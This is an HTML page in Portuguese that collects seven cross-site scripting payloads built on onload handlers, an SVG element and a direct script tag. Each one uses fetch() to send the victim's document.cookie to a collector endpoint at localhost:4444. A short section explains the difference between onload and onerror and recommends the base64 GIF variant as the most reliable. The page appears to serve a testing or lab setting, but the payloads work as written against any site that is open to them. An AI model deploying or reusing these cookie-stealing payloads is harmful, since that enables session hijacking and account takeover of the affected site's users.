<!DOCTYPE html>
<html>
<head>
    <title>XSS Payloads com onload</title>
</head>
<body>

<h2>Payloads XSS usando onload (ao inv√©s de onerror)</h2>

<h3>Op√ß√£o 1: IMG com base64 (Recomendado)</h3>
<textarea rows="2" cols="100">
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))">
</textarea>

<h3>Op√ß√£o 2: IMG com URL v√°lida pequena</h3>
<textarea rows="2" cols="100">
<img src="https://httpbin.org/image/png?x=1" onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))" width="1" height="1">
</textarea>

<h3>Op√ß√£o 3: IFRAME com about:blank</h3>
<textarea rows="2" cols="100">
<iframe src="about:blank" onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))" style="display:none"></iframe>
</textarea>

<h3>Op√ß√£o 4: SVG onload</h3>
<textarea rows="2" cols="100">
<svg onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))"></svg>
</textarea>

<h3>Op√ß√£o 5: Script direto (sempre executa)</h3>
<textarea rows="3" cols="100">
<script>
fetch("http://localhost:4444/debug-cookie?cookie="+encodeURIComponent(document.cookie));
</script>
</textarea>

<h3>Op√ß√£o 6: IMG com redirect para executar onload</h3>
<textarea rows="2" cols="100">
<img src="http://httpbin.org/redirect/1" onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))">
</textarea>

<h3>Op√ß√£o 7: LINK onload (funciona em alguns browsers)</h3>
<textarea rows="2" cols="100">
<link rel="stylesheet" href="data:text/css," onload="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))">
</textarea>

<hr>

<h3>üí° Explica√ß√£o das diferen√ßas:</h3>
<ul>
    <li><strong>onerror:</strong> Executa quando h√° erro ao carregar o recurso</li>
    <li><strong>onload:</strong> Executa quando o recurso carrega com sucesso</li>
    <li><strong>A Op√ß√£o 1</strong> usa uma imagem GIF 1x1 transparente em base64 que sempre carrega</li>
    <li><strong>A Op√ß√£o 3</strong> usa iframe que carrega about:blank (sempre funciona)</li>
    <li><strong>A Op√ß√£o 5</strong> √© direta e sempre executa independente de load/error</li>
</ul>

<p><strong>Dica:</strong> A Op√ß√£o 1 √© a mais confi√°vel para onload pois a imagem base64 sempre carrega com sucesso.</p>

</body>
</html>